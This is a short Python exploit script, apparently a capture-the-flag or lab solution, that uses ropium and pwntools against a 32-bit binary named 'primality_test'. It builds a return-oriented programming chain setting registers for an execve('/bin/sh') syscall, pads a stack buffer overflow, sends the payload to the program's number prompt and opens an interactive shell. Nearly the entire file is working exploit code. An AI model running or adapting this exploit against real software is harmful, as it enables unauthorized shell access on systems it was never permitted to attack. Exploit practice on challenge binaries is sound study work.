from ropium import *
from pwn import *

file_path = './primality_test'
EXE_FILE = file_path

rop = ROPium(ARCH.X86)
rop.load(file_path)

POP_EAX_INT = 0x08048606  # pop eax; int 0x80;
INT = 0x08048607  # int 0x80;
BIN_SH = 0x08048991  # "/bin/sh"

rop.os = OS.LINUX
'''
fallisce

chain = rop.compile('sys_execve(0x08048991, 0, 0)')
'''

rop.bad_bytes = [0x0a]

chain = rop.compile('eax=0xb')
chain += rop.compile('ecx=0')
chain += rop.compile('ebx=' + str(BIN_SH))
chain += rop.compile('edx=0')

print(chain.dump())

ropchain = b'A'*(0x4c + 4) + chain.dump('raw') + p32(INT)

print(ropchain[80:])

io = process([EXE_FILE])
io.sendlineafter(b'Enter a number: ', ropchain)
io.interactive()
